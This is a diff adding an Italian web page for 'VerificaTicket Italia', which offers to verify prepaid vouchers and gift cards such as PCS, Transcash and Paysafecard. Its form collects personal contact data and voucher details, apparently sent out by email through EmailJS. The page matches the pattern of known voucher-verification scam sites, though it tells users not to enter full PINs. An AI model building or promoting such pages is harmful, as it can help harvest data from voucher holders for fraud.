@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VerificaTicket Italia — Gestione richieste</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Script EmailJS pour l'envoi d'email -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="site-header">
+    <div class="container header-inner">
+        <a href="#" class="logo">
+            <span class="logo-icon">VT</span>
+            <span class="logo-text">VerificaTicket <strong>Italia</strong></span>
+        </a>
+        <nav class="main-nav">
+            <a href="#tickets">Ticket</a>
+            <a href="#richiesta">Richiesta</a>
+        </nav>
+        <a href="#richiesta" class="btn btn-primary header-cta">Verifica il tuo ticket</a>
+    </div>
+</header>
+
+<!-- HERO SECTION -->
+<section class="hero">
+    <div class="container hero-content">
+        <h1>Gestisci la tua richiesta di <span class="gradient-text">verifica ticket</span></h1>
+        <p class="hero-subtitle">
+            Invia in modo semplice e sicuro le informazioni relative al tuo ticket prepagato.
+            Il nostro team esaminerà la tua richiesta e ti ricontatterà.
+        </p>
+        <a href="#richiesta" class="btn btn-primary btn-lg">Inizia la richiesta</a>
+    </div>
+</section>
+
+<!-- SECTION TICKETS -->
+<section id="tickets" class="section tickets-section">
+    <div class="container">
+        <h2 class="section-title">Tipi di ticket supportati</h2>
+        <p class="section-subtitle">Clicca sulla carta del tuo ticket per selezionarlo automaticamente nel modulo.</p>
+        
+        <div class="tickets-grid" id="ticketsGrid">
+            <!-- Les cartes seront générées par JavaScript pour simplifier le HTML -->
+        </div>
+    </div>
+</section>
+
+<!-- SECTION FORMULAIRE -->
+<section id="richiesta" class="section form-section">
+    <div class="container">
+        <div class="form-wrapper">
+            <h2 class="section-title">Modulo di richiesta</h2>
+            <p class="section-subtitle">I campi contrassegnati con * sono obbligatori.</p>
+
+            <form id="requestForm" novalidate>
+                
+                <!-- SECTION A : INFOS PERSONNELLES -->
+                <fieldset class="form-section-group">
+                    <legend>👤 Informazioni personali</legend>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="firstname">Nome *</label>
+                            <input type="text" id="firstname" name="firstname" placeholder="Mario">
+                            <span class="error-msg" id="err-firstname"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="lastname">Cognome *</label>
+                            <input type="text" id="lastname" name="lastname" placeholder="Rossi">
+                            <span class="error-msg" id="err-lastname"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Indirizzo email *</label>
+                            <input type="email" id="email" name="email" placeholder="mario.rossi@email.it">
+                            <span class="error-msg" id="err-email"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Numero di telefono *</label>
+                            <input type="tel" id="phone" name="phone" placeholder="+39 333 123 4567">
+                            <span class="error-msg" id="err-phone"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="country">Paese *</label>
+                            <input type="text" id="country" name="country" placeholder="Italia">
+                            <span class="error-msg" id="err-country"></span>
+                        </div>
+                    </div>
+                </fieldset>
+
+                <!-- SECTION B : INFOS TICKET -->
+                <fieldset class="form-section-group">
+                    <legend>🎫 Informazioni del ticket</legend>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="ticket_type">Tipo di ticket *</label>
+                            <select id="ticket_type" name="ticket_type">
+                                <option value="">— Seleziona un ticket —</option>
+                                <option value="PCS">PCS</option>
+                                <option value="Transcash">Transcash</option>
+                                <option value="Neosurf">Neosurf</option>
+                                <option value="Paysafecard">Paysafecard</option>
+                                <option value="Cashlib">Cashlib</option>
+                                <option value="Flexepin">Flexepin</option>
+                                <option value="Amazon Gift Card">Amazon Gift Card</option>
+                                <option value="Steam Gift Card">Steam Gift Card</option>
+                                <option value="Google Play Gift Card">Google Play Gift Card</option>
+                                <option value="Apple Gift Card">Apple Gift Card</option>
+                                <option value="PlayStation Store Card">PlayStation Store Card</option>
+                                <option value="Xbox Gift Card">Xbox Gift Card</option>
+                                <option value="Netflix Gift Card">Netflix Gift Card</option>
+                                <option value="Nintendo eShop Card">Nintendo eShop Card</option>
+                                <option value="Razer Gold">Razer Gold</option>
+                            </select>
+                            <span class="error-msg" id="err-ticket_type"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="amount">Importo (€) *</label>
+                            <input type="number" id="amount" name="amount" placeholder="50.00" step="0.01">
+                            <span class="error-msg" id="err-amount"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="purchase_date">Data di acquisto *</label>
+                            <input type="date" id="purchase_date" name="purchase_date">
+                            <span class="error-msg" id="err-purchase_date"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="purchase_country">Paese di acquisto *</label>
+                            <input type="text" id="purchase_country" name="purchase_country" placeholder="Italia">
+                            <span class="error-msg" id="err-purchase_country"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="public_ticket_reference">Numero di riferimento non riservato *</label>
+                            <input type="text" id="public_ticket_reference" name="public_ticket_reference" placeholder="Es. 1234567890">
+                            <span class="error-msg" id="err-public_ticket_reference"></span>
+                        </div>
+                        <div class="form-group">
+                            <label for="last_four">Ultime 4 cifre (opzionale)</label>
+                            <input type="text" id="last_four" name="last_four" maxlength="4" placeholder="1234">
+                            <span class="error-msg" id="err-last_four"></span>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group checkbox-group">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="privacy" name="privacy">
+                            <span>Acconsento al trattamento dei miei dati personali. *</span>
+                        </label>
+                        <span class="error-msg" id="err-privacy"></span>
+                    </div>
+                    <p class="security-note">🔒 Non inserire codici PIN completi, password o dati bancari.</p>
+                </fieldset>
+
+                <!-- SECTION C : ENVOI -->
+                <fieldset class="form-section-group submit-group">
+                    <button type="submit" class="btn btn-primary btn-xl" id="submitBtn">
+                        INVIA LA RICHIESTA
+                    </button>
+                    <div class="progress-container" id="progressContainer" hidden>
+                        <div class="progress-bar" id="progressBar"></div>
+                        <span class="progress-label" id="progressLabel">0%</span>
+                    </div>
+                </fieldset>
+            </form>
+
+            <!-- MESSAGE DE SUCCÈS -->
+            <div id="successMessage" class="success-message" hidden>
+                <div class="success-icon">✅</div>
+                <h3>Richiesta inviata con successo!</h3>
+                <p>La tua richiesta è stata registrata e inviata al nostro team.</p>
+                <p>Ti ricontatteremo al più presto via email.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+    <div class="container footer-bottom">
+        <p>&copy; 2026 VerificaTicket Italia. I marchi citati appartengono ai rispettivi proprietari.</p>
+    </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
